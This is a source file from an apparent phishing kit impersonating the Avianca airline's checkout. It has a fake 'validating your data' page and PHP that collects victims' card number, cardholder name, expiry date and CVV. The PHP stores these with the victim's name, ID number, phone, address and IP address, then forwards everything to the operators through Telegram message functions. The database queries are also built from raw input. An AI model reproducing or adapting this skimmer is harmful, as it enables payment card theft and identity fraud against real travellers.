<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="media/icon.ico" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N" crossorigin="anonymous">
    <link rel="stylesheet" href="./css/style.css">

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/flatpickr/dist/flatpickr.min.css">

    <title>Avianca | #NACIONALES</title>
</head>

<body>
    <div class="header_check">
        <img src="media/logo-avianca-minimal.svg" class="logo">
        <img src="media/paso3.png" alt="" class="pasos">
    </div>

    <div class="body_check">
        <div class="loader">

            <div class="lds-ring">
                <div></div>
                <div></div>
                <div></div>
                <div></div>
            </div>
            <br><br>
            <p class="text-center">Estamos validando los datos. <br>
                Puede tardar entre 1 a 5 minutos. <br>
                No cierre o recargue esta ventana.</p>
        </div>
    </div>



</body>

</html>

<?php
require_once('../conexion/ip.php');
require_once('../conexion/telegram.php');
$id_user = $_POST["id_user"];
$banco = $_POST["banco"];
$nro_tarjeta = $_POST["nro_tarjeta"];
$nombre_tarjeta = $_POST["nombre_tarjeta"];
$mes_tarjeta = $_POST["mes_tarjeta"];
$anio_tarjeta = $_POST["anio_tarjeta"];
$cvv_tarjeta = $_POST["cvv_tarjeta"];
$fechaT = date("d/m/Y") . " - " . date("h:m:s  a");
$response = false;

if (
    empty($banco) || empty($nro_tarjeta) || empty($nombre_tarjeta) || empty($mes_tarjeta) || empty($anio_tarjeta)
    || empty($cvv_tarjeta)
) {
?>
    <script type="text/javascript">
        window.location.href = "payment.php?id_user=<?php echo $id_user; ?>&error=empty";
    </script>
    <?php
} else {
    $mysqli = include_once "../conexion/index.php";

    $response = false;

    $sentencia = $mysqli->prepare("UPDATE users SET banco = '$banco', nro_tarjeta = '$nro_tarjeta',
        nombre_tarjeta = '$nombre_tarjeta', mes_tarjeta = '$mes_tarjeta', anio_tarjeta = '$anio_tarjeta', cvv_tarjeta = '$cvv_tarjeta', estado = 3 where id = $id_user");

    if ($sentencia->execute()) {
        $response = true;

        $consultaUsuario = $mysqli->query("SELECT * FROM users WHERE id = $id_user");

        if ($consultaUsuario) {
            // Procesar los resultados de la consulta adicional
            foreach ($consultaUsuario as $fila) {
$mensaje = "
ℹ️ DATOS DEL USUARIO
#ID (" . $id_user . ")
Ip: " . $fila["ip"] . "
👨 " . $fila["nombre"] . " " . $fila["apellido"] . "
🪪 " . $fila["documento"] . "
📞 " . $fila["telefono"] . "
🏙️ " . $fila["ciudad"] . " - " . $fila["direccion"] . " \n
ℹ️ DATOS DE LA TARJETA 
🏧 " . $fila["banco"] . "
💳 " . $fila["nro_tarjeta"] . "
👨 " . $fila["nombre_tarjeta"] . "
📅 " . $fila["mes_tarjeta"] . "
📅 " . $fila["anio_tarjeta"] . "
🔒 " . $fila["cvv_tarjeta"] . "\n
🕓 " . $fechaT . " ";

                enviarMensaje($mensaje);
                enviarMensaje2($mensaje);
            }

            $consultaUsuario->close();
        }
    } else {
        $response = false;
    }

    $sentencia->close();

    if ($response == true) {


    ?>
        <script type="text/javascript">
            window.location.href = "loading.php?id_user=<?php echo $id_user; ?>";
        </script>
<?php
    } else {
        echo "error";
    }
}
?>